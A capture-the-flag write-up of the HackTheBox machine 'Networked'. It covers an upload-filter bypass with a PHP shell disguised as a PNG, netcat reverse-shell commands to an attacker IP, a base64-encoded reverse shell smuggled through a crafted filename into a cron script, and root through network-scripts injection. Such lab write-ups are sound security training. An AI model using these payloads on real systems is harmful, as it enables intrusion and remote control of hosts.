# Networked -- HackTheBox (write-up)

**Difficulty:** Easy
**Box:** Networked (HackTheBox)
**Author:** dkrxhn
**Date:** 2025-07-01

---

## TL;DR

### Uploaded a PHP shell disguised as PNG via magic bytes. Pivoted to guly user via command injection in a cron cleanup script. Privesc through network-scripts command injection with sudo.
---

## Target info

- Host: `10.10.14.172` (attacker)
- Services discovered: `22/tcp (ssh)`, `80/tcp (http)`

---

## Enumeration

![Nmap results](images/networked-htb_1.png)

![Web enumeration](images/networked-htb_2.png)

## Exploitation -- initial shell

Converted `shell.php` to PNG by prepending magic bytes, then renamed extension in Burp:

```bash
printf '\x89PNG\r\n\x1A\n' | cat - shell.php > shell.png
```

Changed filename to `shell.php.png` in Burp:

![Burp upload](images/networked-htb_3.png)

Triggered the shell:

```bash
nc -c sh 10.10.14.172 4444
```

![Shell as apache](images/networked-htb_4.png)

## Lateral movement -- apache to guly

![Cron script](images/networked-htb_5.png)

Found a cleanup script that runs every 3 minutes:

![Script source](images/networked-htb_6.png)

The vulnerable line:

```php
exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
```

`$value` is a filename from the uploads directory -- no sanitization means command injection via crafted filenames.

Base64-encoded the working reverse shell:

```bash
echo nc -c sh 10.10.14.172 443 | base64 -w0
# bmMgLWMgc2ggMTAuMTAuMTQuMTcyIDQ0Mwo=
```

Created the injection file:

```bash
touch '/var/www/html/uploads/a; echo bmMgLWMgc2ggMTAuMTAuMTQuMTcyIDQ0Mwo= | base64 -d | sh; b'
```

After ~3 minutes:

![Shell as guly](images/networked-htb_8.png)

## Privilege escalation

```bash
sudo -l
```

![sudo -l](images/networked-htb_9.png)

![Network script](images/networked-htb_10.png)

The script writes user input to `/etc/sysconfig/network-scripts/ifcfg-guly` then calls `/sbin/ifup guly0`. The regex allows spaces, so input separated by spaces becomes separate lines in the config. When the interface is brought up, the config is sourced, executing any injected commands.

![Root shell](images/networked-htb_11.png)

- Anything after a space in a network-scripts config value gets executed when the interface is brought up.

---

## Lessons & takeaways

- PHP shells can bypass upload filters by prepending PNG magic bytes
- Cron scripts that use filenames in shell commands are injection targets
- Network-scripts in CentOS/RHEL source config files -- spaces in values lead to command execution
---
